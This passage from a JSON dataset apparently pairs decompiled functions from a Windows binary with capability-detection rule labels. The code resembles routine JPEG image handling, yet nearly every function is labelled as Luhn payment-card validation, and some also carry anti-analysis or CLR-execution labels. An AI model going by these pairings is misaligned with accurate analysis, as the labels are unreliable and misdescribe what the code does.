        "decompiled_code": "\nvoid __cdecl fcn.00437b40(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_EAX;\n    uint32_t uVar8;\n    char **in_ECX;\n    char *pcVar9;\n    int32_t *in_EDX;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    int32_t *var_34h;\n    int32_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    char **var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(in_EAX + 0x1cc);\n    iVar3 = *(in_EAX + 0x78);\n    iVar4 = *(in_EAX + 0x70);\n    var_1ch = 0;\n    var_34h = in_EDX;\n    var_24h = in_ECX;\n    if (0 < arg_8h) {\n        do {\n            fcn.0043e53c();\n            iVar5 = *(iVar2 + 0x30);\n            var_18h = 0;\n            var_30h = iVar2 + 0x34;\n            if (0 < iVar3) {\n                do {\n                    pcVar9 = *var_24h;\n                    puVar10 = *var_34h + var_18h;\n                    iVar6 = *(*(iVar2 + 0x18) + var_18h * 4);\n                    iVar7 = *var_30h;\n                    uVar8 = 0;\n                    for (iVar11 = iVar4; iVar11 != 0; iVar11 = iVar11 + -1) {\n                        iVar1 = uVar8 * 4;\n                        uVar8 = uVar8 + 1 & 0xf;\n                        *pcVar9 = *pcVar9 + *(iVar6 + *puVar10 + *(iVar7 + iVar5 * 0x40 + iVar1));\n                        pcVar9 = pcVar9 + 1;\n                        puVar10 = puVar10 + iVar3;\n                    }\n                    var_18h = var_18h + 1;\n                    var_30h = var_30h + 1;\n                } while (var_18h < iVar3);\n            }\n            *(iVar2 + 0x30) = iVar5 + 1U & 0xf;\n            var_1ch = var_1ch + 1;\n            var_34h = var_34h + 1;\n            var_24h = var_24h + 1;\n        } while (var_1ch < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 676
    },
    "00437f20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00437f20(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    iVar2 = *(in_EAX + 0x70) * 2 + 4;\n    puVar3 = *(in_EAX + 0x1cc) + 0x44;\n    for (iVar4 = 0; iVar4 < *(in_EAX + 0x78); iVar4 = iVar4 + 1) {\n        uVar1 = (**(*(in_EAX + 4) + 4))(iVar2);\n        *puVar3 = uVar1;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "004380e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004380e0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint8_t **in_EDX;\n    int16_t *piVar5;\n    uint8_t **var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x1cc) + 0x18);\n    iVar2 = *(in_EAX + 0x70);\n    var_4h = 0;\n    var_ch = in_EDX;\n    if (0 < arg_8h) {\n        do {\n            puVar3 = *var_ch;\n            for (iVar4 = iVar2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                piVar5 = *(iVar1 + (*puVar3 >> 3) * 4) + (puVar3[1] >> 2) * 0x40 + (puVar3[2] >> 3) * 2;\n                *piVar5 = *piVar5 + 1;\n                if (*piVar5 == 0) {\n                    *piVar5 = *piVar5 + -1;\n                }\n                puVar3 = puVar3 + 3;\n            }\n            var_4h = var_4h + 1;\n            var_ch = var_ch + 1;\n        } while (var_4h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 355
    },
    "00438190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00438190(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = 0;\n    iVar3 = 0;\n    iVar1 = 0;\n    if (0 < param_2) {\n        do {\n            if (iVar2 < *(in_EAX + 0x18)) {\n                iVar2 = *(in_EAX + 0x18);\n                iVar3 = in_EAX;\n            }\n            iVar1 = iVar1 + 1;\n            in_EAX = in_EAX + 0x20;\n        } while (iVar1 < param_2);\n    }\n    return iVar3;\n}\n",
        "token_count": 173
    },
    "004386a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004386a4(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t in_EAX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint16_t *puVar7;\n    int32_t iStack40;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    iStack40 = 0;\n    iStack36 = 0;\n    iStack32 = 0;\n    iStack28 = 0;\n    iVar5 = *param_2;\n    piVar1 = *(*(in_EAX + 0x1cc) + 0x18) + iVar5 * 4;\n    for (; iVar3 = param_2[2],  iVar5 <= param_2[1]; iVar5 = iVar5 + 1) {\n        for (; iVar3 <= param_2[3]; iVar3 = iVar3 + 1) {\n            puVar7 = *piVar1 + iVar3 * 0x40 + param_2[4] * 2;\n            for (iVar6 = param_2[4]; iVar6 <= param_2[5]; iVar6 = iVar6 + 1) {\n                uVar2 = *puVar7;\n                puVar7 = puVar7 + 1;\n                uVar4 = uVar2;\n                if (uVar4 != 0) {\n                    iStack40 = iStack40 + uVar4;\n                    iStack36 = iStack36 + (iVar5 * 8 + 4) * uVar4;\n                    iStack32 = iStack32 + (iVar3 * 4 + 2) * uVar4;\n                    iStack28 = iStack28 + (iVar6 * 8 + 4) * uVar4;\n                }\n            }\n        }\n        piVar1 = piVar1 + 1;\n    }\n    iVar5 = iStack40 >> 1;\n    piVar1 = *(in_EAX + 0x88);\n    *(*piVar1 + param_1) = (iVar5 + iStack36) / iStack40;\n    *(piVar1[1] + param_1) = (iVar5 + iStack32) / iStack40;\n    *(piVar1[2] + param_1) = (iVar5 + iStack28) / iStack40;\n    return;\n}\n",
        "token_count": 562
    },
    "00438880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00438880(uchar *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t in_EDX;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint var_43ch;\n    int32_t *var_3ch;\n    uint8_t *var_38h;\n    uint8_t *var_34h;\n    uint8_t *var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = *(in_EAX + 0x84);\n    var_10h = in_EDX + 0x18;\n    var_1ch = in_EDX + in_EDX + 0x18 >> 1;\n    var_14h = in_ECX + 0x1c;\n    var_20h = in_ECX + in_ECX + 0x1c >> 1;\n    var_18h = arg_ch + 0x18;\n    var_24h = arg_ch + arg_ch + 0x18 >> 1;\n    var_2ch = 0x7fffffff;\n    var_28h = 0;\n    var_3ch = &var_43ch;\n    var_38h = *(*(in_EAX + 0x88) + 8);\n    var_34h = *(*(in_EAX + 0x88) + 4);\n    var_30h = **(in_EAX + 0x88);\n    var_8h = in_ECX;\n    var_4h = in_EDX;\n    if (0 < *(in_EAX + 0x84)) {\n        do {\n            uVar6 = *var_30h;\n            if (uVar6 < var_4h) {\n                iVar5 = (uVar6 - var_4h) * (uVar6 - var_4h);\n                iVar4 = (uVar6 - var_10h) * (uVar6 - var_10h);\n            }\n            else if (var_10h < uVar6) {\n                iVar5 = (uVar6 - var_10h) * (uVar6 - var_10h);\n                iVar4 = (uVar6 - var_4h) * (uVar6 - var_4h);\n            }\n            else {\n                iVar5 = 0;\n                if (var_1ch < uVar6) {\n                    iVar4 = (uVar6 - var_4h) * (uVar6 - var_4h);\n                }\n                else {\n                    iVar4 = (uVar6 - var_10h) * (uVar6 - var_10h);\n                }\n            }\n            uVar6 = *var_34h;\n            if (uVar6 < var_8h) {\n                iVar1 = (uVar6 - var_8h) * 3;\n                iVar2 = (uVar6 - var_14h) * 3;\n                iVar5 = iVar5 + iVar1 * iVar1;\n                iVar4 = iVar4 + iVar2 * iVar2;\n            }\n            else if (var_14h < uVar6) {\n                iVar1 = (uVar6 - var_14h) * 3;\n                iVar2 = (uVar6 - var_8h) * 3;\n                iVar5 = iVar5 + iVar1 * iVar1;\n                iVar4 = iVar4 + iVar2 * iVar2;\n            }\n            else if (var_20h < uVar6) {\n                iVar1 = (uVar6 - var_8h) * 3;\n                iVar4 = iVar4 + iVar1 * iVar1;\n            }\n            else {\n                iVar1 = (uVar6 - var_14h) * 3;\n                iVar4 = iVar4 + iVar1 * iVar1;\n            }\n            uVar6 = *var_38h;\n            if (uVar6 < arg_ch) {\n                iVar1 = (uVar6 - arg_ch) * 2;\n                iVar5 = iVar5 + iVar1 * iVar1;\n                iVar1 = (uVar6 - var_18h) * 2;\n                iVar4 = iVar4 + iVar1 * iVar1;\n            }\n            else if (var_18h < uVar6) {\n                iVar1 = (uVar6 - var_18h) * 2;\n                iVar5 = iVar5 + iVar1 * iVar1;\n                iVar1 = (uVar6 - arg_ch) * 2;\n                iVar4 = iVar4 + iVar1 * iVar1;\n            }\n            else if (var_24h < uVar6) {\n                iVar1 = (uVar6 - arg_ch) * 2;\n                iVar4 = iVar4 + iVar1 * iVar1;\n            }\n            else {\n                iVar1 = (uVar6 - var_18h) * 2;\n                iVar4 = iVar4 + iVar1 * iVar1;\n            }\n            *var_3ch = iVar5;\n            if (iVar4 < var_2ch) {\n                var_2ch = iVar4;\n            }\n            var_28h = var_28h + 1;\n            var_3ch = var_3ch + 1;\n            var_38h = var_38h + 1;\n            var_34h = var_34h + 1;\n            var_30h = var_30h + 1;\n        } while (var_28h < var_ch);\n    }\n    iVar5 = 0;\n    var_28h = 0;\n    piVar3 = &var_43ch;\n    if (0 < var_ch) {\n        do {\n            if (*piVar3 <= var_2ch) {\n                iVar5 = iVar5 + 1;\n                *arg_8h = var_28h;\n                arg_8h = arg_8h + 1;\n            }\n            var_28h = var_28h + 1;\n            piVar3 = piVar3 + 1;\n        } while (var_28h < var_ch);\n    }\n    return iVar5;\n}\n",
        "token_count": 1473
    },
    "004393e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004393e0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iStack16;\n    \n    iVar1 = *(in_EAX + 0x1a8);\n    iVar2 = *(in_EAX + 0x13c);\n    iVar3 = (***(in_EAX + 4))();\n    *(iVar1 + 0x38) = iVar3;\n    *(iVar1 + 0x3c) = iVar3 + *(in_EAX + 0x24) * 4;\n    iStack16 = *(in_EAX + 0xd8);\n    for (iVar3 = 0; iVar3 < *(in_EAX + 0x24); iVar3 = iVar3 + 1) {\n        iVar4 = (*(iStack16 + 0xc) * *(iStack16 + 0x24)) / *(in_EAX + 0x13c);\n        iVar5 = (***(in_EAX + 4))();\n        iVar5 = iVar5 + iVar4 * 4;\n        *(*(iVar1 + 0x38) + iVar3 * 4) = iVar5;\n        *(*(iVar1 + 0x3c) + iVar3 * 4) = iVar5 + (iVar2 + 4) * iVar4 * 4;\n        iStack16 = iStack16 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "004394a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004394a8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint uVar6;\n    int32_t in_EAX;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t *piStack32;\n    uint *puStack28;\n    uint *puStack24;\n    uint *puStack20;\n    \n    iVar1 = *(in_EAX + 0x1a8);\n    iVar2 = *(in_EAX + 0x13c);\n    iStack44 = 0;\n    iStack40 = *(in_EAX + 0xd8);\n    piStack32 = iVar1 + 8;\n    for (; iStack44 < *(in_EAX + 0x24); iStack44 = iStack44 + 1) {\n        iVar7 = (*(iStack40 + 0xc) * *(iStack40 + 0x24)) / *(in_EAX + 0x13c);\n        puVar3 = *(*(iVar1 + 0x38) + iStack44 * 4);\n        puVar4 = *(*(iVar1 + 0x3c) + iStack44 * 4);\n        puVar5 = *piStack32;\n        puStack28 = puVar5;\n        puStack24 = puVar4;\n        puStack20 = puVar3;\n        for (iVar8 = 0; iVar8 < (iVar2 + 2) * iVar7; iVar8 = iVar8 + 1) {\n            uVar6 = *puStack28;\n            *puStack24 = uVar6;\n            *puStack20 = uVar6;\n            puStack20 = puStack20 + 1;\n            puStack24 = puStack24 + 1;\n            puStack28 = puStack28 + 1;\n        }\n        for (iVar8 = 0; SBORROW4(iVar8, iVar7 * 2) != iVar8 + iVar7 * -2 < 0; iVar8 = iVar8 + 1) {\n            puVar4[(iVar2 + -2) * iVar7 + iVar8] = puVar5[iVar7 * iVar2 + iVar8];\n            puVar4[iVar7 * iVar2 + iVar8] = puVar5[(iVar2 + -2) * iVar7 + iVar8];\n        }\n        iVar8 = 0;\n        if (0 < iVar7) {\n            do {\n                puVar3[iVar8 - iVar7] = *puVar3;\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < iVar7);\n        }\n        piStack32 = piStack32 + 1;\n        iStack40 = iStack40 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 636
    },
    "004395f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004395f0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint *puStack24;\n    uint *puStack20;\n    \n    iVar1 = *(in_EAX + 0x1a8);\n    iVar2 = *(in_EAX + 0x13c);\n    iStack32 = 0;\n    iStack28 = *(in_EAX + 0xd8);\n    for (; iStack32 < *(in_EAX + 0x24); iStack32 = iStack32 + 1) {\n        iVar5 = (*(iStack28 + 0xc) * *(iStack28 + 0x24)) / *(in_EAX + 0x13c);\n        puVar3 = *(*(iVar1 + 0x38) + iStack32 * 4);\n        puVar4 = *(*(iVar1 + 0x3c) + iStack32 * 4);\n        iVar6 = 0;\n        puStack24 = puVar3;\n        puStack20 = puVar4;\n        if (0 < iVar5) {\n            do {\n                puVar3[iVar6 - iVar5] = puVar3[(iVar2 + 1) * iVar5 + iVar6];\n                puVar4[iVar6 - iVar5] = puVar4[(iVar2 + 1) * iVar5 + iVar6];\n                puVar3[(iVar2 + 2) * iVar5 + iVar6] = *puStack24;\n                puVar4[(iVar2 + 2) * iVar5 + iVar6] = *puStack20;\n                iVar6 = iVar6 + 1;\n                puStack20 = puStack20 + 1;\n                puStack24 = puStack24 + 1;\n            } while (iVar6 < iVar5);\n        }\n        iStack28 = iStack28 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 466
    },
    "0043abf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043abf0(int32_t arg_8h, int32_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    uVar1 = *(*(in_EAX + 0x1b0) + 0x10);\n    uVar2 = arg_8h - *arg_ch;\n    if (uVar1 < arg_8h - *arg_ch) {\n        uVar2 = uVar1;\n    }\n    var_ch = 0;\n    var_4h = in_EAX;\n    (**(*(in_EAX + 0x1c4) + 4))(uVar2, &var_ch, *(*(in_EAX + 0x1b0) + 0xc), arg_14h);\n    (**(*(var_4h + 0x1cc) + 4))(var_ch);\n    *arg_ch = *arg_ch + var_ch;\n    return;\n}\n",
        "token_count": 257
    },
    "0043b090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b090(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    puVar1 = (***(in_EAX + 4))(param_1);\n    *(in_EAX + 0x1c0) = puVar1;\n    *puVar1 = 0x43ae3c;\n    puVar1 = puVar1 + 0xb;\n    iVar3 = *(in_EAX + 0xd8);\n    for (iVar4 = 0; iVar4 < *(in_EAX + 0x24); iVar4 = iVar4 + 1) {\n        uVar2 = (***(in_EAX + 4))();\n        *(iVar3 + 0x50) = uVar2;\n        fcn.004318ac(*(iVar3 + 0x50), 0, 0x100);\n        *puVar1 = 0xffffffff;\n        puVar1 = puVar1 + 1;\n        iVar3 = iVar3 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "0043b124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b124(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_1ch;\n    code **var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1c4);\n    if (*(in_EAX + 0x138) <= *(iVar1 + 0x5c)) {\n        var_18h = iVar1 + 0x34;\n        for (var_ch = 0; var_ch < *(in_EAX + 0x24); var_ch = var_ch + 1) {\n            (**var_18h)(var_ch * 4 + iVar1 + 0xc);\n            var_18h = var_18h + 1;\n        }\n        *(iVar1 + 0x5c) = 0;\n    }\n    var_14h = *(in_EAX + 0x138) - *(iVar1 + 0x5c);\n    if (*(iVar1 + 0x60) < var_14h) {\n        var_14h = *(iVar1 + 0x60);\n    }\n    uVar2 = arg_8h - *arg_ch;\n    if (uVar2 < var_14h) {\n        var_14h = uVar2;\n    }\n    (**(*(in_EAX + 0x1c8) + 4))(var_14h, *arg_ch * 4 + arg_10h);\n    *arg_ch = *arg_ch + var_14h;\n    *(iVar1 + 0x60) = *(iVar1 + 0x60) - var_14h;\n    iVar3 = *(iVar1 + 0x5c) + var_14h;\n    *(iVar1 + 0x5c) = iVar3;\n    if (*(in_EAX + 0x138) <= iVar3) {\n        *in_ECX = *in_ECX + 1;\n    }\n    return;\n}\n",
        "token_count": 514
    },
    "0043b2fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b2fc(uint *arg_8h)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint *in_ECX;\n    uchar *puVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = *arg_8h;\n    for (var_8h = 0; var_8h < *(in_EAX + 0x138); var_8h = var_8h + 1) {\n        puVar3 = *in_ECX;\n        puVar2 = *var_ch;\n        puVar4 = puVar2 + *(in_EAX + 0x70);\n        for (; puVar2 < puVar4; puVar2 = puVar2 + 2) {\n            uVar1 = *puVar3;\n            puVar3 = puVar3 + 1;\n            *puVar2 = uVar1;\n            puVar2[1] = uVar1;\n        }\n        var_ch = var_ch + 1;\n        in_ECX = in_ECX + 1;\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "0043b358": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0043b358(uint *arg_8h)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uchar *puVar2;\n    uint *in_ECX;\n    uchar *puVar3;\n    uchar *puVar4;\n    uint *var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = *arg_8h;\n    var_10h = in_ECX;\n    for (var_ch = 0; var_ch < *(in_EAX + 0x138); var_ch = var_ch + 2) {\n        puVar2 = *var_14h;\n        puVar4 = puVar2 + *(in_EAX + 0x70);\n        puVar3 = *var_10h;\n        for (; puVar2 < puVar4; puVar2 = puVar2 + 2) {\n            uVar1 = *puVar3;\n            puVar3 = puVar3 + 1;\n            *puVar2 = uVar1;\n            puVar2[1] = uVar1;\n        }\n        fcn.0043e4e0(*(in_EAX + 0x70), 1, var_ch + 1);\n        var_10h = var_10h + 1;\n        var_14h = var_14h + 2;\n    }\n    return;\n}\n",
        "token_count": 342
    },
    "0043b3e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b3e8(uint *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    int32_t in_EAX;\n    uint8_t **in_ECX;\n    int32_t in_EDX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t **var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = *arg_8h;\n    for (var_ch = 0; var_ch < *(in_EAX + 0x138); var_ch = var_ch + 1) {\n        puVar2 = *var_10h;\n        uVar1 = **in_ECX;\n        puVar4 = *in_ECX + 1;\n        *puVar2 = uVar1;\n        puVar2[1] = uVar1 * 3 + *puVar4 + 2 >> 2;\n        for (iVar5 = *(in_EDX + 0x28) + -2; puVar3 = puVar2 + 2,  iVar5 != 0; iVar5 = iVar5 + -1) {\n            uVar1 = *puVar4;\n            *puVar3 = puVar4[-1] + uVar1 * 3 + 1 >> 2;\n            puVar2[3] = uVar1 * 3 + puVar4[1] + 2 >> 2;\n            puVar4 = puVar4 + 1;\n            puVar2 = puVar3;\n        }\n        uVar1 = *puVar4;\n        *puVar3 = uVar1 * 3 + puVar4[-1] + 1 >> 2;\n        puVar2[3] = uVar1;\n        var_10h = var_10h + 1;\n        in_ECX = in_ECX + 1;\n    }\n    return;\n}\n",
        "token_count": 449
    },
    "0043c624": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c624(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t in_EAX;\n    int16_t *in_ECX;\n    int32_t in_EDX;\n    \n    *(*arg_ch + arg_8h) = *(*(in_EAX + 0x144) + 0x80 + (*in_ECX * **(in_EDX + 0x50) + 4 >> 3 & 0x3ffU));\n    return;\n}\n",
        "token_count": 115
    },
    "0043ddec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0043ddec(void)\n\n{\n    uint8_t uVar1;\n    uint8_t **ppuVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint32_t uStack20;\n    \n    ppuVar2 = in_EAX[6];\n    puVar5 = *ppuVar2;\n    puVar6 = ppuVar2[1];\n    if (puVar6 == NULL) {\n        iVar3 = (*ppuVar2[3])();\n        if (iVar3 == 0) {\n            uVar4 = 0;\n            goto code_r0x0043de80;\n        }\n        puVar5 = *ppuVar2;\n        puVar6 = ppuVar2[1];\n    }\n    puVar6 = puVar6 + -1;\n    uVar1 = *puVar5;\n    puVar5 = puVar5 + 1;\n    if (puVar6 == NULL) {\n        iVar3 = (*ppuVar2[3])();\n        if (iVar3 == 0) {\n            uVar4 = 0;\n            goto code_r0x0043de80;\n        }\n        puVar5 = *ppuVar2;\n        puVar6 = ppuVar2[1];\n    }\n    uStack20 = *puVar5;\n    if ((uVar1 != 0xff) || (uStack20 != 0xd8)) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0x35;\n        *(iVar3 + 0x18) = uVar1;\n        *(iVar3 + 0x1c) = uStack20;\n        (***in_EAX)();\n    }\n    uVar4 = 1;\n    in_EAX[0x68] = uStack20;\n    *ppuVar2 = puVar5 + 1;\n    ppuVar2[1] = puVar6 + -1;\ncode_r0x0043de80:\n    return CONCAT44(uStack20, uVar4);\n}\n",
        "token_count": 478
    },
    "0043e35c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043e35c(void)\n\n{\n    int32_t in_EAX;\n    code **ppcVar1;\n    code **ppcVar2;\n    int32_t iVar3;\n    \n    ppcVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1b8) = ppcVar1;\n    *ppcVar1 = fcn.0043e324;\n    ppcVar2 = ppcVar1 + 8;\n    ppcVar1[1] = 0x43de88;\n    ppcVar1[2] = 0x43e198;\n    ppcVar1[7] = fcn.0043dc3c;\n    ppcVar1[0x18] = NULL;\n    iVar3 = 0;\n    do {\n        *ppcVar2 = fcn.0043dc3c;\n        ppcVar2[0x11] = NULL;\n        iVar3 = iVar3 + 1;\n        ppcVar2 = ppcVar2 + 1;\n    } while (iVar3 < 0x10);\n    ppcVar1[8] = 0x43d7d4;\n    ppcVar1[0x16] = 0x43d7d4;\n    fcn.0043e324();\n    return;\n}\n",
        "token_count": 298
    },
    "0043e4c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043e4c8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = in_EAX + param_2 + -1;\n    return iVar1 - iVar1 % param_2;\n}\n",
        "token_count": 72
    },
    "0043e4e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e4e0(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_8h_00;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *puVar1;\n    uint *puVar2;\n    uint var_4h;\n    \n    puVar1 = in_EAX + in_EDX * 4;\n    puVar2 = in_ECX + arg_10h * 4;\n    if (0 < arg_ch) {\n        do {\n            arg_ch_00 = *puVar1;\n            puVar1 = puVar1 + 1;\n            arg_8h_00 = *puVar2;\n            puVar2 = puVar2 + 1;\n            fcn.004318c0(arg_8h_00, arg_ch_00, arg_8h);\n            arg_ch = arg_ch + -1;\n        } while (0 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "0043e53c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e53c(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    \n    fcn.004318ac(in_EAX, 0, param_2);\n    return;\n}\n",
        "token_count": 52
    },
    "0043e7d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0043e7d4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX < 1) {\n        in_EAX = 1;\n    }\n    if (100 < in_EAX) {\n        in_EAX = 100;\n    }\n    if (in_EAX < 0x32) {\n        iVar1 = 5000 / in_EAX;\n    }\n    else {\n        iVar1 = in_EAX * -2 + 200;\n    }\n    return iVar1;\n}\n",
        "token_count": 125
    },
    "0043ee30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
